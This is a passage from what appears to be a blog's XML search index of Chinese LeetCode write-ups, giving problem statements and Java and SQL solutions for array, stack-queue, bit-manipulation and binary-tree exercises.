<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findTheDistanceValue</span><span class="params">(<span class="keyword">int</span>[] arr1, <span class="keyword">int</span>[] arr2, <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		Arrays.sort(arr2);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i : arr1) &#123;</span><br><span class="line">			<span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">			<span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">int</span> right = arr2.length - <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">				<span class="keyword">int</span> mid = right - (right - left) / <span class="number">2</span>;</span><br><span class="line">				<span class="keyword">if</span> (Math.abs(i - arr2[mid]) &lt;= d) &#123;</span><br><span class="line">					flag = <span class="keyword">false</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (i - arr2[mid] &gt; d) &#123;</span><br><span class="line">					left = mid + <span class="number">1</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					right = mid - <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			count += flag ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>1327. 列出指定时间段内所有的下单产品</title>
    <url>/2020/04/10/LeetCode/leetcode-001327-%E5%88%97%E5%87%BA%E6%8C%87%E5%AE%9A%E6%97%B6%E9%97%B4%E6%AE%B5%E5%86%85%E6%89%80%E6%9C%89%E7%9A%84%E4%B8%8B%E5%8D%95%E4%BA%A7%E5%93%81/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表: <code>Products</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------------+---------+</span><br><span class="line">| Column Name      | Type    |</span><br><span class="line">+------------------+---------+</span><br><span class="line">| product_id       | int     |</span><br><span class="line">| product_name     | varchar |</span><br><span class="line">| product_category | varchar |</span><br><span class="line">+------------------+---------+</span><br><span class="line">product_id 是该表主键。</span><br><span class="line">该表包含该公司产品的数据。</span><br></pre></td></tr></table></figure>

<p>表: <code>Orders</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| product_id    | <span class="keyword">int</span>     |</span><br><span class="line">| order_date    | date    |</span><br><span class="line">| unit          | <span class="keyword">int</span>     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">该表无主键，可能包含重复行。</span><br><span class="line">product_id 是表单 Products 的外键。</span><br><span class="line">unit 是在日期 order_date 内下单产品的数目。</span><br></pre></td></tr></table></figure>

<p>写一个 SQL 语句，要求获取在 2020 年 2 月份下单的数量不少于 100 的产品的名字和数目。</p>
<p>返回结果表单的顺序无要求。</p>
<p>查询结果的格式如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Products 表:</span><br><span class="line">+-------------+-----------------------+------------------+</span><br><span class="line">| product_id  | product_name          | product_category |</span><br><span class="line">+-------------+-----------------------+------------------+</span><br><span class="line">| <span class="number">1</span>           | Leetcode Solutions    | Book             |</span><br><span class="line">| <span class="number">2</span>           | Jewels of Stringology | Book             |</span><br><span class="line">| <span class="number">3</span>           | HP                    | Laptop           |</span><br><span class="line">| <span class="number">4</span>           | Lenovo                | Laptop           |</span><br><span class="line">| <span class="number">5</span>           | Leetcode Kit          | T-shirt          |</span><br><span class="line">+-------------+-----------------------+------------------+</span><br><span class="line"></span><br><span class="line">Orders 表:</span><br><span class="line">+--------------+--------------+----------+</span><br><span class="line">| product_id   | order_date   | unit     |</span><br><span class="line">+--------------+--------------+----------+</span><br><span class="line">| <span class="number">1</span>            | <span class="number">2020</span>-<span class="number">02</span>-<span class="number">05</span>   | <span class="number">60</span>       |</span><br><span class="line">| <span class="number">1</span>            | <span class="number">2020</span>-<span class="number">02</span>-<span class="number">10</span>   | <span class="number">70</span>       |</span><br><span class="line">| <span class="number">2</span>            | <span class="number">2020</span>-<span class="number">01</span>-<span class="number">18</span>   | <span class="number">30</span>       |</span><br><span class="line">| <span class="number">2</span>            | <span class="number">2020</span>-<span class="number">02</span>-<span class="number">11</span>   | <span class="number">80</span>       |</span><br><span class="line">| <span class="number">3</span>            | <span class="number">2020</span>-<span class="number">02</span>-<span class="number">17</span>   | <span class="number">2</span>        |</span><br><span class="line">| <span class="number">3</span>            | <span class="number">2020</span>-<span class="number">02</span>-<span class="number">24</span>   | <span class="number">3</span>        |</span><br><span class="line">| <span class="number">4</span>            | <span class="number">2020</span>-<span class="number">03</span>-<span class="number">01</span>   | <span class="number">20</span>       |</span><br><span class="line">| <span class="number">4</span>            | <span class="number">2020</span>-<span class="number">03</span>-<span class="number">04</span>   | <span class="number">30</span>       |</span><br><span class="line">| <span class="number">4</span>            | <span class="number">2020</span>-<span class="number">03</span>-<span class="number">04</span>   | <span class="number">60</span>       |</span><br><span class="line">| <span class="number">5</span>            | <span class="number">2020</span>-<span class="number">02</span>-<span class="number">25</span>   | <span class="number">50</span>       |</span><br><span class="line">| <span class="number">5</span>            | <span class="number">2020</span>-<span class="number">02</span>-<span class="number">27</span>   | <span class="number">50</span>       |</span><br><span class="line">| <span class="number">5</span>            | <span class="number">2020</span>-<span class="number">03</span>-<span class="number">01</span>   | <span class="number">50</span>       |</span><br><span class="line">+--------------+--------------+----------+</span><br><span class="line"></span><br><span class="line">Result 表:</span><br><span class="line">+--------------------+---------+</span><br><span class="line">| product_name       | unit    |</span><br><span class="line">+--------------------+---------+</span><br><span class="line">| Leetcode Solutions | <span class="number">130</span>     |</span><br><span class="line">| Leetcode Kit       | <span class="number">100</span>     |</span><br><span class="line">+--------------------+---------+</span><br><span class="line"></span><br><span class="line"><span class="number">2020</span> 年 <span class="number">2</span> 月份下单 product_id = <span class="number">1</span> 的产品的数目总和为 (<span class="number">60</span> + <span class="number">70</span>) = <span class="number">130</span> 。</span><br><span class="line"><span class="number">2020</span> 年 <span class="number">2</span> 月份下单 product_id = <span class="number">2</span> 的产品的数目总和为 <span class="number">80</span> 。</span><br><span class="line"><span class="number">2020</span> 年 <span class="number">2</span> 月份下单 product_id = <span class="number">3</span> 的产品的数目总和为 (<span class="number">2</span> + <span class="number">3</span>) = <span class="number">5</span> 。</span><br><span class="line"><span class="number">2020</span> 年 <span class="number">2</span> 月份 product_id = <span class="number">4</span> 的产品并没有下单。</span><br><span class="line"><span class="number">2020</span> 年 <span class="number">2</span> 月份下单 product_id = <span class="number">5</span> 的产品的数目总和为 (<span class="number">50</span> + <span class="number">50</span>) = <span class="number">100</span> 。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select p.product_name,sum(unit) as unit from Products p</span><br><span class="line">join Orders o on o.product_id=p.product_id</span><br><span class="line">where order_date between <span class="string">'2020-02-01'</span> and <span class="string">'2020-02-29'</span></span><br><span class="line">group by p.product_id</span><br><span class="line">having unit&gt;=<span class="number">100</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1403. 非递增顺序的最小子序列</title>
    <url>/2020/04/10/LeetCode/leetcode-001403.%20%E9%9D%9E%E9%80%92%E5%A2%9E%E9%A1%BA%E5%BA%8F%E7%9A%84%E6%9C%80%E5%B0%8F%E5%AD%90%E5%BA%8F%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个数组 nums，请你从中抽取一个子序列，满足该子序列的元素之和 严格 大于未包含在该子序列中的各元素之和。</p>
<p>如果存在多个解决方案，只需返回 长度最小 的子序列。如果仍然有多个解决方案，则返回 元素之和最大 的子序列。</p>
<p>与子数组不同的地方在于，「数组的子序列」不强调元素在原数组中的连续性，也就是说，它可以通过从数组中分离一些（也可能不分离）元素得到。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>题目数据保证满足所有约束条件的解决方案是 <strong>唯一</strong> 的。同时，返回的答案应当按 <strong>非递增顺序</strong> 排列。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [4,3,10,9,8]</span><br><span class="line">输出：[10,9] </span><br><span class="line">解释：子序列 [10,9] 和 [10,8] 是最小的、满足元素之和大于其他各元素之和的子序列。但是 [10,9] 的元素之和最大。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line">输出：[<span class="number">7</span>,<span class="number">7</span>,<span class="number">6</span>] </span><br><span class="line">解释：子序列 [<span class="number">7</span>,<span class="number">7</span>] 的和为 <span class="number">14</span> ，不严格大于剩下的其他元素之和（<span class="number">14</span> = <span class="number">4</span> + <span class="number">4</span> + <span class="number">6</span>）。因此，[<span class="number">7</span>,<span class="number">6</span>,<span class="number">7</span>] 是满足题意的最小子序列。注意，元素按非递增顺序返回。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [6]</span><br><span class="line">输出：[6]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= nums.length &lt;= 500</code></li>
<li><code>1 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>排序，而后求和大于总和一半的序列</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">minSubsequence</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		Arrays.sort(nums);</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">			sum += num;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> n = nums.length - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> tempSum = <span class="number">0</span>;</span><br><span class="line">		sum = sum / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">while</span> (n &gt;= <span class="number">0</span> &amp;&amp; tempSum &lt;= sum) &#123;</span><br><span class="line">			tempSum += nums[n];</span><br><span class="line">			result.add(nums[n]);</span><br><span class="line">			n--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 03.04. 化栈为队</title>
    <url>/2020/04/10/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-03.04-%E5%8C%96%E6%A0%88%E4%B8%BA%E9%98%9F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现一个MyQueue类，该类用两个栈来实现一个队列。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MyQueue queue &#x3D; new MyQueue();</span><br><span class="line"></span><br><span class="line">queue.push(1);</span><br><span class="line">queue.push(2);</span><br><span class="line">queue.peek();  &#x2F;&#x2F; 返回 1</span><br><span class="line">queue.pop();   &#x2F;&#x2F; 返回 1</span><br><span class="line">queue.empty(); &#x2F;&#x2F; 返回 false</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>你只能使用标准的栈操作 – 也就是只有 push to top, peek/pop from top, size 和 is empty 操作是合法的。</li>
<li>你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。</li>
<li>假设所有操作都是有效的 （例如，一个空的队列不会调用 pop 或者 peek 操作）。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">class MyQueue &#123;</span><br><span class="line">	</span><br><span class="line">	Stack&lt;Integer&gt; s1;</span><br><span class="line">	Stack&lt;Integer&gt; s2;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    public MyQueue() &#123;</span><br><span class="line">    	s1 = new Stack&lt;&gt;();</span><br><span class="line">    	s2 = new Stack&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">    public void push(int x) &#123;</span><br><span class="line">    	s1.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">    public int pop() &#123;</span><br><span class="line">    	if (s2.empty()) &#123;</span><br><span class="line">    		while (!s1.empty()) &#123;</span><br><span class="line">    			s2.push(s1.pop());</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	return s2.pop();</span><br><span class="line">    	</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the front element. */</span></span><br><span class="line">    public int peek() &#123;</span><br><span class="line">    	if (s2.empty()) &#123;</span><br><span class="line">    		while (!s1.empty()) &#123;</span><br><span class="line">    			s2.push(s1.pop());</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	return s2.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">    public boolean empty() &#123;</span><br><span class="line">    	return s1.empty() &amp;&amp; s2.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Stack</tag>
        <tag>Queue</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 16.07. 最大数值</title>
    <url>/2020/04/10/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-16.07-%E6%9C%80%E5%A4%A7%E6%95%B0%E5%80%BC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个方法，找出两个数字<code>a</code>和<code>b</code>中最大的那一个。不得使用if-else或其他比较运算符。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： a &#x3D; 1, b &#x3D; 2</span><br><span class="line">输出： 2</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>同号相减永不溢出，异号相比无脑选正。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先考虑没有溢出时的情况，计算 b - a 的最高位，依照题目所给提示 k = 1 时 a &gt; b，即 b - a 为负</span></span><br><span class="line">        <span class="keyword">int</span> k = b - a &gt;&gt;&gt; <span class="number">31</span>;</span><br><span class="line">        <span class="comment">// 再考虑 a b 异号的情况，此时无脑选是正号的数字</span></span><br><span class="line">        <span class="keyword">int</span> aSign = a &gt;&gt;&gt; <span class="number">31</span>, bSign = b &gt;&gt;&gt; <span class="number">31</span>;</span><br><span class="line">        <span class="comment">// diff = 0 时同号，diff = 1 时异号</span></span><br><span class="line">        <span class="keyword">int</span> diff = aSign ^ bSign;</span><br><span class="line">        <span class="comment">// 在异号，即 diff = 1 时，使之前算出的 k 无效，只考虑两个数字的正负关系</span></span><br><span class="line">        k = k &amp; (diff ^ <span class="number">1</span>) | bSign &amp; diff;</span><br><span class="line">        <span class="keyword">return</span> a * k + b * (k ^ <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>平均值法</p>
<p><code>max(a, b) = ((a + b) + abs(a - b)) / 2</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maximum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> _sum = <span class="keyword">long</span>(a) + <span class="keyword">long</span>(b);</span><br><span class="line">        <span class="keyword">long</span> _diff = <span class="keyword">long</span>(a) - <span class="keyword">long</span>(b);</span><br><span class="line">        <span class="keyword">long</span> _abs_diff = (_diff ^ (_diff &gt;&gt; <span class="number">63</span>)) - (_diff &gt;&gt; <span class="number">63</span>);</span><br><span class="line">        <span class="keyword">return</span> (_sum + _abs_diff) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode-cn.com/problems/maximum-lcci/solution/chun-wei-yun-suan-bu-yong-longzhuan-huan-bu-yong-n/" target="_blank" rel="noopener">题解1</a></p>
<p><a href="https://leetcode-cn.com/problems/maximum-lcci/solution/ji-yu-wei-yun-suan-shi-xian-da-xiao-bi-jiao-by-dex/" target="_blank" rel="noopener">题解2</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题54. 二叉搜索树的第k大节点</title>
    <url>/2020/04/10/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-54-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E7%AC%ACk%E5%A4%A7%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一棵二叉搜索树，请找出其中第k大的节点。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: root &#x3D; [3,1,4,null,2], k &#x3D; 1</span><br><span class="line">   3</span><br><span class="line">  &#x2F; \</span><br><span class="line"> 1   4</span><br><span class="line">  \</span><br><span class="line">   2</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: root = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="number">1</span>], k = <span class="number">3</span></span><br><span class="line">       <span class="number">5</span></span><br><span class="line">      / \</span><br><span class="line">     <span class="number">3</span>   <span class="number">6</span></span><br><span class="line">    / \</span><br><span class="line">   <span class="number">2</span>   <span class="number">4</span></span><br><span class="line">  /</span><br><span class="line"> <span class="number">1</span></span><br><span class="line">输出: <span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="限制："><a href="#限制：" class="headerlink" title="限制："></a>限制：</h2><ul>
<li>1 ≤ k ≤ 二叉搜索树元素个数</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>中序遍历</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ans = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kthLargest</span><span class="params">(TreeNode root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// clarification:  root == null?   k &lt;= 1?</span></span><br><span class="line">        helper(root, k);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(TreeNode root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root.right != <span class="keyword">null</span>) helper(root.right, k);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (++count == k) &#123;</span><br><span class="line">            ans = root.val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (root.left != <span class="keyword">null</span>) helper(root.left, k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>中序遍历</tag>
        <tag>Top K</tag>
      </tags>
  </entry>
  <entry>
    <title>1385. 两个数组间的距离值</title>
    <url>/2020/04/10/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-09-%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;CQueue&quot;,&quot;appendTail&quot;,&quot;deleteHead&quot;,&quot;deleteHead&quot;]</span><br><span class="line">[[],[3],[],[]]</span><br><span class="line">输出：[null,null,3,-1]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[<span class="string">"CQueue"</span>,<span class="string">"deleteHead"</span>,<span class="string">"appendTail"</span>,<span class="string">"appendTail"</span>,<span class="string">"deleteHead"</span>,<span class="string">"deleteHead"</span>]</span><br><span class="line">[[],[],[<span class="number">5</span>],[<span class="number">2</span>],[],[]]</span><br><span class="line">输出：[<span class="keyword">null</span>,-<span class="number">1</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="number">5</span>,<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= values &lt;= 10000</code></li>
<li><code>最多会对 appendTail、deleteHead 进行 10000 次调用</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CQueue</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	Stack&lt;Integer&gt; s1;</span><br><span class="line">	Stack&lt;Integer&gt; s2;</span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	s1 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    	s2 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">appendTail</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    	s1.push(value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">deleteHead</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (s2.empty()) &#123;</span><br><span class="line">    		<span class="keyword">while</span> (!s1.empty()) &#123;</span><br><span class="line">    			s2.push(s1.pop());</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">if</span> (s2.empty()) &#123;</span><br><span class="line">    		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    	&#125; </span><br><span class="line">    	<span class="keyword">return</span> s2.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Stack</tag>
        <tag>Queue</tag>
      </tags>
  </entry>
  <entry>
    <title>1082. 销售分析 I</title>
    <url>/2020/04/10/LeetCode/leetcode-001082.%20%E9%94%80%E5%94%AE%E5%88%86%E6%9E%90%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>产品表：<code>Product</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+---------+</span><br><span class="line">| Column Name  | Type    |</span><br><span class="line">+--------------+---------+</span><br><span class="line">| product_id   | int     |</span><br><span class="line">| product_name | varchar |</span><br><span class="line">| unit_price   | int     |</span><br><span class="line">+--------------+---------+</span><br><span class="line">product_id 是这个表的主键.</span><br></pre></td></tr></table></figure>

<p>销售表：<code>Sales</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+---------+</span><br><span class="line">| Column Name | Type    |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| seller_id   | int     |</span><br><span class="line">| product_id  | int     |</span><br><span class="line">| buyer_id    | int     |</span><br><span class="line">| sale_date   | date    |</span><br><span class="line">| quantity    | int     |</span><br><span class="line">| price       | int     |</span><br><span class="line">+------ ------+---------+</span><br><span class="line">这个表没有主键，它可以有重复的行.</span><br><span class="line">product_id 是 Product 表的外键.</span><br></pre></td></tr></table></figure>

<p>编写一个 SQL 查询，查询总销售额最高的销售者，如果有并列的，就都展示出来。</p>
<p>查询结果格式如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Product 表：</span><br><span class="line">+------------+--------------+------------+</span><br><span class="line">| product_id | product_name | unit_price |</span><br><span class="line">+------------+--------------+------------+</span><br><span class="line">| 1          | S8           | 1000       |</span><br><span class="line">| 2          | G4           | 800        |</span><br><span class="line">| 3          | iPhone       | 1400       |</span><br><span class="line">+------------+--------------+------------+</span><br><span class="line"></span><br><span class="line">Sales 表：</span><br><span class="line">+-----------+------------+----------+------------+----------+-------+</span><br><span class="line">| seller_id | product_id | buyer_id | sale_date  | quantity | price |</span><br><span class="line">+-----------+------------+----------+------------+----------+-------+</span><br><span class="line">| 1         | 1          | 1        | 2019-01-21 | 2        | 2000  |</span><br><span class="line">| 1         | 2          | 2        | 2019-02-17 | 1        | 800   |</span><br><span class="line">| 2         | 2          | 3        | 2019-06-02 | 1        | 